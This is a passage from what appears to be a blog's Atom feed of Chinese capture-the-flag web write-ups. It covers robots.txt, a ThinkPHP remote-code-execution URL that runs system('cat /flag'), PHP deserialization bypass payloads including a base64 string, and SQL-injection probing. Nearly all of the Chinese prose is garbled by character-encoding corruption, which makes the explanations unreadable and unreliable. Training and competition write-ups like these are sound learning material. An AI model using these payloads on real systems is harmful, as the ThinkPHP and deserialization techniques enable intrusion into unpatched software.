    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;â€”ï¼‰XSSçš„ä¸­æ–‡åç§°å«è·¨ç«™è„šæœ¬ï¼Œæ˜¯WEBæ¼æ´ä¸­æ¯”è¾ƒå¸¸è§çš„ä¸€ç§ï¼Œç‰¹ç‚¹å°±æ˜¯å¯ä»¥å°†æ¶æ„HTML/JavaScriptä»£ç æ³¨å…¥åˆ°å—å®³ç”¨æˆ·æµè§ˆ</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œwebè¿›é˜¶</title>
    <link href="http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/"/>
    <id>http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/</id>
    <published>2021-03-12T09:23:20.000Z</published>
    <updated>2021-05-22T02:48:25.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>æˆ‘ä»¬ç‚¹å‡»é¢˜ç›®åœºæ™¯ï¼Œå‘ç°è·³è½¬åˆ°1.php</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/1.png" alt="1"></p><p>æŸ¥é˜…èµ„æ–™å‘ç°ä¸€èˆ¬ç½‘ç«™çš„åˆå§‹é¡µé¢éƒ½æ˜¯index.phpï¼Œäºæ˜¯åœ¨urlä¸­è¾“å…¥index.phpï¼Œä½†æ˜¯åˆè‡ªåŠ¨è·³è½¬åˆ°1.phpã€‚</p><p>F12è¿›å…¥å¼€å‘è€…æ¨¡å¼ï¼ŒæŸ¥çœ‹ç½‘ç»œæ¨¡å—ï¼š</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/2.png" alt="2"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagå°±åœ¨å…¶ä¸­ï¼ŒåŒæ—¶å‘ç°ç½‘é¡µè·³è½¬çš„åŸå› å°±æ˜¯<code>location</code>æŒ‡å‘æ–‡ä»¶1.phpã€‚</p><p><strong>spï¼š</strong>locationâ€”â€”ç”¨äºé‡å®šå‘ä¸€ä¸ªæ–°çš„ä½ç½®ï¼ŒåŒ…å«ä¸€ä¸ªæ–°çš„urlã€‚è¡¨ç¤ºç”¨æˆ·åº”å½“åˆ°æŒ‡å®šåœ°å€æå–æ–‡ä»¶ã€‚</p><h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿå¯¹robots.txtçš„äº†è§£å’Œä½œç”¨ã€‚</p><p><strong>robots.txtæ–‡ä»¶</strong>æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä½¿ç”¨ä»»ä½•ä¸€ä¸ªå¸¸è§çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚Windowsç³»ç»Ÿè‡ªå¸¦çš„Notepadï¼Œå°±å¯ä»¥åˆ›å»ºå’Œç¼–è¾‘å®ƒ  ã€‚robots.txtæ˜¯ä¸€ä¸ªåè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚Robots.txtåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œè€Œåªæ˜¯çº¦å®šä¿—æˆçš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ä¿è¯ç½‘ç«™çš„éšç§ã€‚</p><p>å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“æ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æœæ‚¨å¸Œæœ›æœç´¢å¼•æ“æ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚</p><ul><li><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œçœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå¯¹robots.txtçš„ç®€ä»‹<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/3.png" alt="3"></p></li><li><p>è®¿é—®ä¸€ä¸‹è¿™ä¸ªç½‘ç«™çš„robots.txt</p></li></ul><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/4.png" alt="4"></p><ul><li>ç½‘ç«™ä¸è®©æˆ‘ä»¬è®¿é—®è¿™ä¸ªfl0g.phpï¼Œé‚£æˆ‘ä»¬å°±åè®¿é—®<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/5.png" alt="5"></li></ul><p>â€‹       å‘ç°flagï¼Œæ”¶å·¥</p><h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p>æ²¡ææ‡‚</p><p><a href="http://111.200.241.244:42333/?s=/index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=cat%20/flag">http://111.200.241.244:42333/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</a></p><h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>è¿›å…¥é¢˜ç›®é¡µé¢<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/6.png" alt="6"></p><p>æŸ¥çœ‹ç½‘é¡µæºç ã€å›æ˜¾éƒ½æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼ŒæŸ¥é˜…èµ„æ–™å¾—çŸ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡phpsæŸ¥çœ‹phpæºç ã€‚</p><p>phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/7.png" alt="7"></p><p>æŸ¥çœ‹è¯¥é¡µé¢æºç ï¼š<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/8.png" alt="8"></p><p>ä»£ç å®¡è®¡å¯çŸ¥ï¼Œå½“id=adminæ—¶ä¸ä¼šçˆ†flagï¼Œä½†æ˜¯å½“adminç»è¿‡ç¼–ç åå¯å¾—flag</p><p>ç”±äºæœ¬å…³urlè§£ç äº†ä¸¤æ¬¡ï¼ˆæµè§ˆå™¨ä¸Šä¼ æœåŠ¡å™¨ä¸€æ¬¡ï¼Œurldecodeå‡½æ•°ä¸€æ¬¡ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ?id=%2561dmin</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/9.png" alt="9"></p><h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06:"></a>ics-06:</h1><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/10.png" alt="10"></p><p>æˆ‘ä»¬æ ¹æ®é¢˜ç›®æç¤ºæ‰“å¼€æŠ¥è¡¨ä¸­å¿ƒ<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/11.png" alt="11"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°id=1ï¼Œé‚£ä¼šä¸ä¼šæ˜¯å‚æ•°æœ‰é—®é¢˜å‘¢</p><p>ç”¨burpæŠ“åŒ…ï¼Œå¯¹idè¿›è¡Œçˆ†ç ´ï¼Œå‘ç°å½“id=2333æ—¶çˆ†å‡ºflag<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/12.png" alt="12"></p><p>ä½†æ˜¯è¿™é¢˜æœ‰ä¸€ç‚¹ä¸æ˜ç™½ï¼Œå°±æ˜¯ä¸ºä»€ä¹ˆé¢˜ç›®è¯´ï¼šäº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚ä¸ºä»€ä¹ˆç—•è¿¹æ˜¯idçš„å€¼ï¼Ÿ</p><h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_45844670/article/details/108180309">https://blog.csdn.net/weixin_45844670/article/details/108180309</a></p><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>å‚è€ƒ<a href="https://blog.csdn.net/yybzzz/article/details/104971608">https://blog.csdn.net/yybzzz/article/details/104971608</a></p><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>æ¶è¡¥äº†ä¸€ä¸‹ååºåˆ—åŒ–æ“ä½œä¸åºåˆ—åºåˆ—åŒ–æ“ä½œã€‚å‚è€ƒèµ„æ–™ï¼š<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/93884388">https://blog.csdn.net/weixin_44677409/article/details/93884388</a></p><p>æˆ‘è¿™è¾¹å°±ç®€å•çš„æ¦‚æ‹¬ä¸€ä¸‹ï¼š</p><p>åºåˆ—åŒ–â€”â€”å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚</p><p>ååºåˆ—åŒ–â€”â€”å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ã€‚</p><p>å¦‚å›¾åºåˆ—åŒ–å!<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61.assets/image-20210522104411424.png" alt="image-20210522104411424"></p><p><strong>é­”æœ¯æ–¹æ³•ï¼ˆï¼‰ï¼š</strong></p><p>_construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–<br>_destruction()ï¼šç»“æŸæ—¶é”€æ¯å¯¹è±¡<br>_toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ä½¿ç”¨<br>_sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨<br>_wakeup()ï¼šååºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨<br>_call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨<br>_get()ï¼šè°ƒç”¨ç§æœ‰å±æ€§æ—¶ä½¿ç”¨</p><p>æ³¨ï¼š</p><p>1.çš„é­”æœ¯æ–¹æ³•å¿…é¡»å£°æ˜ä¸º <code>public</code></p><p>2.publicå±æ€§åºåˆ—åŒ–åæ ¼å¼ä¸ºï¼šæ•°æ®ç±»å‹:å±æ€§åé•¿åº¦:â€å±æ€§åâ€ã€‚</p><p>äº†è§£äº†ä¸Šè¿°è¿™äº›æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç­”é¢˜å•¦</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/13.png" alt="13"></p><p>æˆ‘ä»¬çœ‹åˆ°<code>wakeup()</code>å‡½æ•°ï¼Œå†ç»“åˆé¢˜ç›®<code>unseriasize3</code>å¯ä»¥å¾—çŸ¥è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–æ“ä½œçš„é¢˜ï¼Œ</p><p>æ ¹æ®å‰ä¸¤è¡Œä»£ç å¯çŸ¥å­˜åœ¨ä¸€ä¸ªæ•°ç»„å<code>xctf</code>ï¼Œé”®æ•°<code>1</code>ï¼Œé”®å<code>flag</code>ï¼Œé”®å€¼<code>111</code>çš„æ•°ç»„ï¼Œ</p><p>åœ¨__wakeup()é­”æœ¯æ–¹æ³•ä¸­ï¼Œåœ¨ååºåˆ—åŒ–å‰ä¼šè‡ªåŠ¨è°ƒç”¨ _wakeupæ–¹æ³•ï¼Œå¼ºåˆ¶è¾“å‡º<code>bad requests</code>ï¼Œå› æ­¤æˆ‘ä»¬è¦ç»•è¿‡ä¹‹</p><p><strong>è§£é¢˜å…³é”®ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°ï¼ˆé”®æ•°ï¼‰çš„å€¼å¤§äºå®é™…çš„å±æ€§ä¸ªæ•°ï¼ˆé”®æ•°ï¼‰æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</strong></p><p>æ„é€ å­—ç¬¦ä¸²<code>?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>ç»•è¿‡__wakeupæ–¹æ³•</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/15.png" alt="15"></p><h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€å‘ç°æ˜¯SQLæ³¨å…¥çš„é¢˜ï¼Œå…ˆæ‹¿sqlmapè·‘äº†ä¸€ä¸‹ï¼Œå‘ç°åªèƒ½è·‘å‡ºæ•°æ®åº“åï¼Œå†ä¸‹å»å°±è·‘ä¸åŠ¨äº†ï¼Œäºæ˜¯åªèƒ½å›æ¥ä¹–ä¹–æ‰‹å·¥æ³¨å…¥ã€‚</p><p>è¾“å…¥<code>1&#39;</code>æŠ¥é”™<img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/16.png" alt="16"></p><p>è¾“å…¥<code>1&#39; and &#39;1&#39;=&#39;1</code>ï¼Œæ­£å¸¸ï¼›</p><p>è¾“å…¥<code>1&#39; and &#39;1&#39;=&#39;2</code>ï¼Œå¼‚å¸¸ï¼›</p><p>å› æ­¤æ³¨å…¥ç±»å‹ä¸º<code>&#39;</code>ã€‚</p><p>å°è¯•unionè”åˆæ³¨å…¥ï¼Œå‘ç°è¿‡æ»¤äº†è®¸å¤šå•è¯</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/17.png" alt="17"></p><p>å› æ­¤é¿å…ä½¿ç”¨å«<code>select</code>è¯­å¥çš„æ–¹å¼å¥½åƒä¹Ÿåªæœ‰å †å æ³¨å…¥äº†</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/rfrder/article/details/108583338">https://blog.csdn.net/rfrder/article/details/108583338</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;baby-web&quot;&gt;&lt;a href=&quot;#baby-web&quot; class=&quot;headerlink&quot; title=&quot;baby_web&quot;&gt;&lt;/a&gt;baby_web&lt;/h1&gt;&lt;p&gt;æˆ‘ä»¬ç‚¹å‡»é¢˜ç›®åœºæ™¯ï¼Œå‘ç°è·³è½¬åˆ°1.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/%E6%94%B</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œwebè¿›é˜¶</title>
    <link href="http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/"/>
    <id>http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/</id>
    <published>2021-03-12T09:23:20.000Z</published>
    <updated>2021-04-17T02:40:04.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><h1 id="Web-php-unserializeï¼šï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#Web-php-unserializeï¼šï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="Web_php_unserializeï¼šï¼ˆååºåˆ—åŒ–ï¼‰"></a>Web_php_unserializeï¼šï¼ˆååºåˆ—åŒ–ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œå°±çœ‹åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ï¼š<code>&#39;/[oc]:\d+:/i&#39;</code></p><p><strong>/XXXX/</strong>      â€”â€”  phpçš„æ­£åˆ™è¡¨è¾¾å¼éœ€è¦æ”¾åœ¨<code>//</code> ä¹‹é—´</p><p><strong>i</strong>                  â€”â€”ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºå¿½ç•¥å¤§å°å†™</p><p><strong>[oc]</strong>             â€”â€”åŒ¹é…oå’Œc: </p><p><strong>\d</strong>                â€”â€”åŒ¹é…ä¸€ä¸ªæ•°å­—</p><p><strong>\d+</strong>              â€”â€”åŒ¹é…å¤šä¸ªæ•°å­—</p><p>ä»£ç å®¡è®¡ï¼šæœåŠ¡å™¨getè·å¾—varçš„å€¼ï¼Œå…ˆå¯¹varçš„å€¼base64è§£ç ï¼Œç„¶åæ­£åˆ™åŒ¹é…åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>Oï¼šæ•°å­—</code>æˆ–<code>Cï¼šæ•°å­—</code>ï¼Œè‹¥ä¸å­˜åœ¨åˆ™åœ¨ååºåˆ—ä¹‹å‰æ‰§è¡Œ__wakeup()é­”æœ¯æ–¹æ³•ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç»•è¿‡æ­£åˆ™åŒ¹é…å’Œ__wakeup()</p><p><code>O:+4:</code>â€”â€”ç»•è¿‡æ­£åˆ™åŒ¹é…</p><p>O:+4:â€Demoâ€:<strong>1</strong>:{s:10:â€Demofileâ€;s:8:â€fl4g.phpâ€;}â€”â€”æŠŠ1æ¢æˆ2ç»•è¿‡__wakeup()</p><p>æœ€åå¯¹payloadè¿›è¡Œbase64encodeï¼Œå¾—ï¼šTzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p><p>æœ€åæœ‰ä¸€ä¸ªé—®é¢˜æ²¡ææ‡‚ï¼šâ€œDemofileâ€åªæœ‰8ä½ï¼Œè€Œå‰é¢å­—æ®µå´å†™äº†10ï¼Œè¿™æ˜¯å› ä¸ºprivateå‹å˜é‡åºåˆ—åŒ–ä¹‹åä¼šå˜æˆâ€œ\x00 + ç±»å + \x00 + å˜é‡åâ€å½¢å¼ã€‚ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==         é”™</p><p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==        å¯¹</p><h1 id="NaNNaNNaNNaN-Batmanï¼šï¼ˆalertå‡½æ•°-ä»£ç å®¡è®¡ï¼‰"><a href="#NaNNaNNaNNaN-Batmanï¼šï¼ˆalertå‡½æ•°-ä»£ç å®¡è®¡ï¼‰" class="headerlink" title="NaNNaNNaNNaN-Batmanï¼šï¼ˆalertå‡½æ•°+ä»£ç å®¡è®¡ï¼‰"></a>NaNNaNNaNNaN-Batmanï¼šï¼ˆalertå‡½æ•°+ä»£ç å®¡è®¡ï¼‰</h1><p>ä¸‹è½½é™„ä»¶1<code>web100.txt</code>ï¼Œæ‰“å¼€å‘ç°æ˜¯ä¹±ç <img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/1.png" alt="1"></p><p>ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œå‘ç°ä¸€ä¸ªè¾“å…¥æ¡†</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/2.png" alt="2"></p><p>ä½†æ˜¯è¾“å…¥ä»€ä¹ˆéƒ½æ²¡ååº”ï¼ŒæŸ¥é˜…èµ„æ–™ï¼š</p><p>evalå‡½æ•°ï¼Œè¿™æ˜¯æ‰§è¡Œå‡½æ•°ï¼›è¿™é‡Œæ‰§è¡Œäº†<code>_</code>å˜é‡ä¸­çš„å†…å®¹(<code>_</code>ç­‰äº$å‡½æ•°çš„å†…å®¹,ä¹Ÿå°±æ˜¯å•å¼•å·ä¹‹é—´å†…å®¹)ï¼Œä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰æ‰§è¡Œ$()å‡½æ•°ï¼Œä»…ä»…æ‰§è¡Œäº†å­—ç¬¦ä¸²è€Œå·²ï¼ˆä»è€Œå¯¼è‡´ä¹±ç ï¼‰ï¼Œå› è€Œé¡µé¢htmlé¡µé¢æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºäº†inputæ ‡ç­¾çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è®©æºä»£ç æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿›è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†alertå¼¹çª—ï¼ˆå°†evalå‡½æ•°æ”¹ä¸ºalertï¼‰ï¼Œå°†ä¹±ç çš„$()å‡½æ•°æºç å®Œæ•´æ˜¾ç¤ºå‡ºæ¥</p><p><img src="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/3.png" alt="3"></p><p>æ•´ç†å¾—ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">if(e.match(/^be0f23/)!=null)</span><br><span class="line">if(e.match(/233ac/)!=null)</span><br><span class="line">if(e.match(/e98aa$/)!=null)</span><br><span class="line">if(e.match(/c7be9/)!=null)</span><br><span class="line">&#123;</span><br><span class="line">var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">var s=[t,n,r,i];</span><br><span class="line">for(var o=0;o<span class="tag">&lt;<span class="name">13;++o)&#123;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">document.write</span>(<span class="attr">s</span>[<span class="attr">o</span>%<span class="attr">4</span>][<span class="attr">0</span>]);<span class="attr">s</span>[<span class="attr">o</span>%<span class="attr">4</span>]<span class="attr">.splice</span>(<span class="attr">0</span>,<span class="attr">1</span>)&#125;</span></span><br><span class="line"><span class="tag">      &#125;</span></span><br><span class="line"><span class="tag">      &#125;</span></span><br><span 